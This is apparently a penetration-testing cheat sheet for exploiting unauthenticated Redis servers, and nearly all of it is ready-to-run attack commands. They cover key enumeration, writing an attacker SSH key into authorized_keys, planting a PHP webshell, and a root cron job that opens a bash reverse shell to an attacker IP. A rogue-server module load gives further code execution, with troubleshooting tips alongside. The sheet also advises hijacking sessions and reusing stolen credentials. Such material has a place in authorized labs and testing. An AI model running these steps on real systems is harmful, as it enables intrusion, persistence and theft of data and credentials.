## Goal
Connect unauthenticated, read keys, and abuse write access to drop an SSH key, webshell, or cron for RCE. Redis(6379) is often wide open.

**Checklist**
- [ ] unauthenticated connect works?
- [ ] any creds/data in keys?
- [ ] can you write? (dir + dbfilename controllable)
- [ ] known writable path? (.ssh / webroot / cron)

# Commands

### Step 1: Connect + enumerate
```bash
nmap -p6379 --script redis-info $IP
redis-cli -h $IP
# inside:
info server            # version, OS, config path
info keyspace          # databases with keys
config get dir         # current working directory
config get dbfilename
keys *                 # list all keys (creds?)
get <key>
select 1               # other databases: select 0/1/... then  keys *
```

### Step 2: RCE via SSH key write
```bash
ssh-keygen -t rsa -f redis_key -N ""
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > redis_payload.txt   # pad it
cat redis_payload.txt | redis-cli -h $IP -x set crackit
redis-cli -h $IP config set dir /home/redis/.ssh/       # or /root/.ssh/
redis-cli -h $IP config set dbfilename "authorized_keys"
redis-cli -h $IP save
ssh -i redis_key redis@$IP
```

### Step 3: RCE via webshell
```bash
redis-cli -h $IP
config set dir /var/www/html
config set dbfilename shell.php
set x "<?php system($_GET['c']); ?>"
save
# then: curl "http://$IP/shell.php?c=id"
```

### Step 4: RCE via cron
```bash
redis-cli -h $IP
config set dir /var/spool/cron/crontabs/    # Debian/Ubuntu (/var/spool/cron/ on RHEL)
config set dbfilename root
set x "\n* * * * * bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1\n"
save
# wait up to 60s -> catch shell on  nc -lvnp 4444
```

### Step 5: Module-load RCE

**Use when:** Redis is reachable without authentication, the version supports modules, and the target can connect back to your VPN address. Confirm the target OS and architecture with `info server`; a locally compiled module must match them.

Tools:

- [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server) — handles rogue replication, module transfer, loading, interaction, and cleanup.
- [RedisModules-ExecuteCommand-AMENDED](https://github.com/struttonpigeon/RedisModules-ExecuteCommand-AMENDED) — builds a repaired module providing `system.exec` and `system.rev`.

```bash
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
git clone https://github.com/struttonpigeon/RedisModules-ExecuteCommand-AMENDED.git

cd RedisModules-ExecuteCommand-AMENDED
make clean
make

MODULE_PATH="$(realpath module.so)"
file "$MODULE_PATH"

cd ../redis-rogue-server
./redis-rogue-server.py \
  --rhost "$IP" \
  --lhost <YOUR_IP> \
  --exp "$MODULE_PATH"
```

`make` produces the local `module.so`. The Python script makes the target Redis server retrieve and load that file, so do not copy it manually to the target. `--lhost` must be an address the target can reach, normally your VPN interface address.

**Interpretation:** Interactive mode invokes `system.exec`; reverse-shell mode invokes `system.rev`. Code execution inherits the Redis service account's privileges and is initial access unless Redis itself runs as root.

**If it fails:**

- Target never connects to the rogue server: recheck `--lhost`, VPN routing, and the rogue-server listening port.
- Module load reports an invalid ELF or architecture error: rebuild for the target architecture and confirm with `file module.so`.
- Module loads but no reverse shell arrives: verify the separate listener IP/port and outbound connectivity from the target.
- Redis rejects replication, configuration changes, or module loading: this path is unavailable; return to credential discovery and other evidence-supported write paths.

### Helpline
```bash
# READING CONNECT: redis-cli connects with no prompt = unauthenticated -> enumerate + try write-to-RCE.
#   "-NOAUTH Authentication required" -> needs a password: redis-cli -h $IP -a <pass> (grep configs/creds).
#   "config set dir" returns ERR = config locked -> read-only, just dump keys for data.
# WHAT THE KEYS HOLD: session tokens (hijack an admin session) or user/password data -> reuse elsewhere.
# THE WRITE-TO-RCE PATHS (need writable config + a known path):
#   config get dir shows the data dir; you REPOINT it. redis runs as root -> SSH key to /root/.ssh/authorized_keys.
#   webroot known -> webshell to /var/www/html. else -> cron to /var/spool/cron/crontabs/ (fires in <=60s).
# check  info  for os + version; a rogue-module server gives direct RCE on older Redis.
# pad the SSH key with blank lines — Redis wraps saved values with junk bytes.
```
